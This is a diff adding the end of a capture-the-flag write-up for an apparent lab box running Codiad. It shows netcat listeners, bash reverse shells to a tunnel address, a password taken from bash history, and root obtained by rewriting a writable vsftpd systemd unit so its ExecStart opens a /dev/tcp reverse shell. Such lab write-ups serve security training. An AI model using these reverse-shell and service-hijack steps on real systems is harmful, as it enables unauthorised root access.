@@ -199,9 +199,116 @@ echo 'bash -c "bash -i >/dev/<tun-address>/2223 0>&1 2>&1"' | nc -lnvp 2222
 ```
 
 secondly,
+
 ```
 nc -lnvp 2223
 ```
+
+After confirmatiom we get this message:
+
+![image](https://cdn-images-1.medium.com/max/800/1*sIccyPw4lxc32HnXlLlk1A.png)
+
+and there is a shell:
+
+```
+$ nc -lnvp 2223
+listening on [any] 2223 ...
+connect to [tun-ip] from (UNKNOWN) [machine-ip] 37512
+bash: cannot set terminal process group (955): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ide:/var/www/html/codiad/components/filemanager$
+```
+
+Let's get the user.txt flag:
+
+![image](https://cdn-images-1.medium.com/max/800/1*-LagBKQ76LJ5IjKzjbFgRA.png)
+
+But, we aren't drac. 
+
+So, we need to be drac.
+
+I tried to find something helpful but the basics helped the most.
+What about bash history?
+There is the password of drac!
+So switch user to drac and then read the first flag.
+
+![image](https://cdn-images-1.medium.com/max/800/1*_-7IlgkNiK4k9kNRVUpOWA.png)
+
+Keep enumarate the system...
+
+Let's check if drac can run files as root.
+
+![image](https://cdn-images-1.medium.com/max/800/1*MCFN7qRRx_J0VzyaCwNfgA.png)
+
+
+Check if drac has write permission to the ftp service file:
+
+
+![image](https://cdn-images-1.medium.com/max/800/1*fWv_aoKuMTm2BQaB6TUluQ.png)
+
+
+He has writting permission, So let's try to inject payload to get a reverse shell as root while restarting the service.
+
+Edit the service file:
+
+```
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/tun-ip/4444 0>&1' <payload-here>
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Set netcat listener: 
+
+```
+nc -lnvp 4444
+```
+
+Restart ftp service:
+
+
+![image](https://cdn-images-1.medium.com/max/800/1*WnDRKdWnGaMJIu2_lQlNfQ.png)
+
+
+and there is a shell as root:
+
+
+![image](https://cdn-images-1.medium.com/max/800/1*FS20bBopPFmCVyDpK-Meqw.png)
+
+
+root.txt has obtained!
+
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
